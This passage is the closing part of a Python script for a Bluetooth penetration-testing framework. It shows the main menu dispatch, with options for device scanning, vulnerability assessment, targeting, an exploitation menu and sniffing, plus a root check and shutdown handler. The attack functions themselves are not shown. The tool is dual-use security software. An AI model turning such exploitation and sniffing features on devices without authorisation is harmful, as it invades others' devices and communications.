            if choice == '1':
                self.display_devices()
            elif choice == '2':
                await self.advanced_vulnerability_assessment()
            elif choice == '3':
                self.target_device()
            elif choice == '4':
                if self.current_target:
                    await self.exploitation_menu()
                else:
                    print(f"{Fore.RED}[!] No target selected. Please select a device first (option 3).")
            elif choice == '5':
                self.bluetooth_sniffing_menu()
            elif choice == '6':
                print(f"{Fore.GREEN}\n[+] Thanks for using the Bluetooth Pentest Framework!")
                print(f"{Fore.CYAN}[*] Developed by Anas Erami - Security Researcher")
                break
            else:
                print(f"{Fore.RED}[!] Invalid option")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print(f"{Fore.RED}[!] Must run as root: sudo {sys.argv[0]}")
        sys.exit(1)
    
    adapter_name = 'hci0'
    if len(sys.argv) > 2 and sys.argv[1] == '--adapter':
        adapter_name = sys.argv[2]
    
    framework = BluetoothPentestFramework(hci_adapter=adapter_name)

    def signal_handler(sig, frame):
        print(f"\n{Fore.RED}[!] Program terminated by user.")
        framework.stop_recording()
        framework.stop_sniffing()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    asyncio.run(framework.run())

